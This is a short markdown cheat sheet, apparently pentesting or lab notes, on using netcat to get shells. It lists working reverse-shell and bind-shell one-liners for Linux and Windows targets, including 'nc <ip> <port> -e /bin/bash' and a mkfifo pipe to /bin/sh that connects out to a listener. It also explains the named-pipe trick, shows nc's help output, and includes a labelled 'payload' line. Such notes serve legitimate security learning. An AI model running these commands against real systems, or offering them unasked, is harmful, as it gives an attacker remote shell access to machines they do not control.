## Shells

#### Reverse shell - Listener on our machine

listen on our machine:
`nc -lvnp <port>`

connect with linux target:
`nc <ip> <port> -e /bin/bash`

if linux target nc does not have `-e`:
`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
*(explanation under bind shell)*

#### Bind shell - listener on target

listen on linux target:
`nc -lvnp <PORT> -e /bin/bash`

listen on windows target:
`nc -lvnp <PORT> -e "cmd.exe"`

if linux target nc does not have `-e`:
`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
- `mkfiko` creates a "named pipe", that is a special file that works as an io stream
- the named pipe output goes to nc
- the output of nc goes to a new shell
- both stdout and stderr of the new shell goes to nc
- the new shell are in other words us on the other computer
- when finished the names pipe file is deleted

connect with our machine:
`nc <ip> <port>`


### Help

```sh
┌──(kali㉿kali)-[~]
└─$ nc -h
[v1.10-47]
connect to somewhere:   nc [-options] hostname port[s] [ports] ... 
listen for inbound:     nc -l -p port [-options] [hostname] [port]
options:
        -c shell commands       as '-e'; use /bin/sh to exec [dangerous!!]
        -e filename             program to exec after connect [dangerous!!]
        -b                      allow broadcasts
        -g gateway              source-routing hop point[s], up to 8
        -G num                  source-routing pointer: 4, 8, 12, ...
        -h                      this cruft
        -i secs                 delay interval for lines sent, ports scanned
        -k                      set keepalive option on socket
        -l                      listen mode, for inbound connects
        -n                      numeric-only IP addresses, no DNS
        -o file                 hex dump of traffic
        -p port                 local port number
        -r                      randomize local and remote ports
        -q secs                 quit after EOF on stdin and delay of secs
        -s addr                 local source address
        -T tos                  set Type Of Service
        -t                      answer TELNET negotiation
        -u                      UDP mode
        -v                      verbose [use twice to be more verbose]
        -w secs                 timeout for connects and final net reads
        -C                      Send CRLF as line-ending
        -z                      zero-I/O mode [used for scanning]
port numbers can be individual or ranges: lo-hi [inclusive];
hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
```


### More




send http request
`nc localhost 80`
GET / HTTP/1.1
(empty line)
or
echo -e "GET / HTTP/1.1\\r\\n\\r\\n" | nc localhost 80

local: nc -lvnp 9090
payload: "nc ip 9090 -e /bin/bash"

nc.exe available on kali at `/usr/share/windows-resources/binaries`

